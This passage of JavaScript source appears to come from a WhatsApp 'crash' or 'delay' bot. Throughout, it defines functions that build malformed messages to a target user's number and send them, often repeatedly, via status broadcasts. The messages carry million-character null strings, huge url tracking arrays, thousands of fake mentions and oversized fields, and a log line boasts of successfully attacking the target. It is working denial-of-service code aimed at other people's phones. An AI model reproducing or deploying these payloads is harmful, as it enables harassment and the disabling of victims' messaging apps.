         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function RamjiDelay(target) {
  try {
    while (Date.now() - Date.now() < 200000) {
      const msg = generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "DEWA DELAY FC",
                format: "EXTENSION_1"
              },
              nativeFlowResponseMessage: {
                name: "payment_info",
                paramsJson: `{\"currency\":\"IRP\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":${"\u0000".repeat(1000000)},\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"XXX\",\"key\":\"+99999999999\",\"key_type\":\"XXX\"}}]}`,
                version: 3
              },
              contextInfo: {
                forwardingScore: 9999,
                isForwarded: true,
                entryPointConversionSource: "payment_method"
              }
            }
          }
        }
      }, {});
      
    let mention = Array.from({ length: 2000 }, (_, i) => `1${i}@s.whatsapp.net`
    );
    const integer = 9999999999999;
    const empty = null;
    const time = 1766016566;
    const txt = "ꦸ".repeat(200000);
    const type = "image/jpeg";
    const newsletterInfo = {
      newsletterJid: "018@newsletter",
      newsletterName: "꧀".repeat(20000),
      contentType: "UPDATE_CARD"
    };
    const contextList = {
       mentionedJid: mention,
        stanzaId: "bsj",
        participant: target,
        remoteJid: target,
        isForwarded: true,
        forwardingScore: 999,
        businessMessageForwardInfo: {
          businessOwnerJid: "0@s.whatsapp.net"
        },
         forwardedNewsletterMessageInfo: newsletterInfo,
          quotedMessage: {
            callLogMessage: {
              isVideo: true,
               callOutcome: "MISSED",
               durationSecs: 999999,
               callType: 1,
               callParticipant: target
              }
            }
         };
    
    let message = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            url: empty,
            mimetype: type,
            fileSha256: Buffer.from(""), 
            fileLength: integer,
            height: integer,
            width: integer,
            mediaKeyTimestamp: time,
            jpegThumbnail: empty,
            caption: txt,
            contextInfo: contextList
          }
        }
      }
    };
    
      await sock.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } });
      await new Promise((r) => setTimeout(r, 1000));
    const msgs = await generateWAMessageFromContent(target, message, {});

    await sock.relayMessage("status@broadcast", msgs.message, {
    messageId: msgs.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta", attrs: {}, content: [{
        tag: "mentioned_users", attrs: {}, content: [{
          tag: "to", attrs: { jid: target }, content: undefined
        }]
      }]
    }]
  });
    }
  } catch (err) {
    console.log(err);
  }
}

async function DelayBebasSpam(target) {
  const messagePayload = {
    headerType: 1,

    stickerMessage: {
      mimetype: "image/webp",
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ?ccb=9-4&oh=01_Q5Aa4QF3oSTcq93hbR9GZrJGjnfTTH7IBgfNaKlDeMfv9Tq-5Q&oe=6A096D42&_nc_sid=e6ed6c&mms3=true",
      directPath: "/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ",
      mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
      fileLength: "10610",
      fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
      fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
      mediaKeyTimestamp: "1775044724",
      stickerSentTs: "9083773766021",
      quotedMessage: {
        conversation: "system error"
      }
    },

    ephemeralMessage: {
      message: {
        documentMessage: {
          fileName: "nullx",
          mimetype: "invisible/nulx",
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ?ccb=9-4&oh=01_Q5Aa4QF3oSTcq93hbR9GZrJGjnfTTH7IBgfNaKlDeMfv9Tq-5Q&oe=6A096D42&_nc_sid=e6ed6c&mms3=true",
          directPath: "/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ",
          mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
          fileLength: 0,
          pageCount: 0,
          fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
          fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
          mediaKeyTimestamp: 99999999999999,
          documentSentTs: "9083773766021",
          quotedMessage: {
            conversation: "system error"
          }
        }
      }
    },

    setUrlTrackingMap: {
      urltrackingmapelements: Array.from(
        { length: 280000 },
        () => ({ type: 1 })
      )
    },

    nativeFlowResponseMessage: {
      messageParamsJson: "{".repeat(55000),
      quotedMessage: {
        conversation: "system error"
      },
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            url: "https://wa.me/setting",
            display_text: "........" + "ោ៝".repeat(890000)
          })
        }
      ]
    }
  };

  await sock.relayMessage("status@broadcast", messagePayload, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function Delay(target) {
    const Msg1 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "D = DK⟅༑", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    const Msg2 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "T = TAMPAN ᝄ", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message", 
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741, 
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    await sock.relayMessage("status@broadcast", Msg1.message, {
        messageId: Msg1.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Msg2.message, {
        messageId: Msg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });
}

async function DelayInvisV1(sock, target) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 999999,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "\u0000".repeat(10000),
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1950 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
        viewOnceMessage: {
         message: {
         interactiveResponseMessage: {
           body: {
            text: "\u0000".repeat(10000),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
           name: "call_permission_request",
           paramsJson: "\u0000".repeat(10000),
           version: 3
       }}}}}
    },
    nativeFlowMessage: {
      messageParamsJson: "\u0000".repeat(10000),
    }
  }
 };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  console.log(chalk.red("Succesfully Attack Target By : @Louishostting"));
}

async function XPopup(sock, target) {
  await sock.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "\0",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "X",
              creator: "X"
            },
            statusAttributionType: 2,
            urlTrackingMap: {
              urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
                type: 1
              }))
            },
            participant: sock.user.id
          },
          body: {
            text: "Xx",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "status:true } }",
            version: 3
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  });
}

async function DelayMakLoe(target) {
  const raraa = {
    groupStatusMessageV2: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
          fileSha256:"SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          fileLength: "10610",
          mediaKeyTimestamp: "1775044724",
          stickerSentTs: "1775044724091", 
          isAvatar: false,
          isAiSticker: false,
          isLottie: null,
          contextInfo: {
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            urlTrackingMap: {
              urlTrackingMapElements: Array.from(
                { length: 500000 },
                () => ({ "\0": "\0" })
              )
            }
          }
        }
      }
    }
  }

  return await sock.relayMessage("status@broadcast", raraa, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}

async function Forcestc(target) {
  for (let p = 0; p < 150; p++) {
    const raa = {
      groupStatusMessageV2: {
        message: {
          messageContextInfo: {
            mentionedJid: [target]
          },
          viewOnceMessageV2: {
            message: {
              stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          fileLength: "10610",
          mediaKeyTimestamp: "1775044724",
          stickerSentTs: "1775044724091", 
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            remoteJid: target,
            mentionedJid: [target],
            urlTrackingMap: {
              urlTrackingMapElements: Array.from(
                { length: 500000 },
                () => ({ "\0": "\0" })
                    )
                  }
                }
              }
            }
          }
        }
      }
    }

    await sock.relayMessage(target, raa, { 
      participant: { jid: target }
    })
  }
 };
 
 async function StickerFC(target){
  const message = {
  "groupStatusMessageV2": {
    "message": {
      "stickerMessage": {
        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        "mimetype": "image/webp",
        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        "fileLength": "10610",
        "mediaKeyTimestamp": "1775044724",
        "stickerSentTs": "1775044724091"
      }
    }
  }
}

  return await sock.relayMessage(target, message, {})
}

async function VnXFcStikerNewAi(sock, target) {
  const AiNew = [
    "13135550001@s.whatsapp.net", "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net", "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net", "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net", "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net", "13135550010@s.whatsapp.net"
  ];   
  const vnxyo = {
      groupStatusMessageV2: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    fileLength: "9999",
                    mediaKeyTimestamp: "-1",
                    stickerSentTs: "-1" 
                }
            }
      }
  };
  const vnxni = {
  groupStatusMessageV2: {
    message: {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724",
        stickerSentTs: "1775044724091"
      },
       contextInfo: {
        mentionedJid: AiNew + vnxyo,
        remoteJid: null, 
         forwardingScore: 9999,
         isForwarded: true,
       }
     }
   }
 }
  return await sock.relayMessage(target, vnxni, {})
}

async function Forcefixxed(target) {
  const Raaa = {
   groupStatusMessageV2: {
     message: {
       stickerMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
         fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
         fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
         mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
         mimetype: "image/webp",
         directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
         fileLength: "10610",
         mediaKeyTimestamp: "1775044724",
         stickerSentTs: "1775044724091"
         }
       }
     }
  }
  
  const msg = generateWAMessageFromContent(target, Raaa, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
    message: msg.message
  }},
  {
   messageId: msg.key.id,
   participant: { jid: target }
  });
  await new Promise((r) => setTimeout(r, 1000));
}

async function VnXFcStikerNewAi(sock, target) {
  const AiNew = [
    "13135550001@s.whatsapp.net", "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net", "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net", "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net", "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net", "13135550010@s.whatsapp.net"
  ];   
  const vnxyo = {
      groupStatusMessageV2: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    fileLength: "9999",
                    mediaKeyTimestamp: "-1",
                    stickerSentTs: "-1" 
                }
            }
      }
  };
  const vnxni = {
  groupStatusMessageV2: {
    message: {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724",
        stickerSentTs: "1775044724091"
      },
       contextInfo: {
        mentionedJid: AiNew + vnxyo,
        remoteJid: null, 
         forwardingScore: 9999,
         isForwarded: true,
       }
     }
   }
 }
  return await sock.relayMessage(target, vnxni, {})
}
            

async function TeamXstromFc(target) {
    const aa = "ꦾ".repeat(20000);
    let Void = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true,
                        locationMessage: {
                            degreesLatitude: 999999999,
                            degreesLongitude: -99999999,
                            name: aa,
                            address: aa,
                        }
                    },
                    body: {
                        text: aa,
                    },
                    footer: {
                        text: aa,
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_call",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "🩸".repeat(5000),
                                })
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "🩸".repeat(5000)
                            }
                        ],
                        messageParamsJson: "{}".repeat(10000)
                    }
                }
            }
        }
    };
    
    let buttons = [
        {
            name: "single_select",
            buttonParamsJson: "",
        },
    ];

    for (let i = 0; i < 100; i++) {
        buttons.push(
            {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                    display_text: "🩸".repeat(5000),
                }),
            },
            {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                    display_text: "🩸".repeat(5000),
                }),
            },
            {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                    display_text: "🩸".repeat(5000),
                }),
            }
        );
    }

    let msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: aa,
                        hasMediaAttachment: false,
                    },
                    body: {
                        text: aa,
                    },
                    footer: {
                        text: aa,
                    },
                    nativeFlowMessage: {
                        buttons: buttons
                    },
                    contextInfo: {
                        forwardingScore: 2147483647,
                        isForwarded: true,
                        isSampled: true,
                        expireAt: 253402300799000,
                        participant: target,
                        remoteJid: "status@broadcast",
                        stanzaId: "🩸".repeat(10000),
                        deviceListMetadata: {
                            senderKeyHash: "🩸".repeat(7000),
                            senderTimestamp: "9999999999999",
                            recipientKeyHash: "🩸".repeat(6000),
                            recipientTimestamp: "8888888888888",
                            userIdentity: "🩸".repeat(4000)
                        },
                        botInvocationMetadata: {
                            botId: "exploit_bot@",
                            invocationType: "BOT_INVOCATION_TYPE_QUERY",
                            invocationSource: "BOT_INVOCATION_SOURCE_QUICK_REPLY",
                            botMessageSecret: "🩸".repeat(4000)
                        },
                        newsletterAdminInviteMessage: {
                            newsletterJid: "123456789@newsletter",
                            newsletterName: "🩸".repeat(9000),
                            caption: "🩸".repeat(10000),
                            inviteExpiration: 253402300799000,
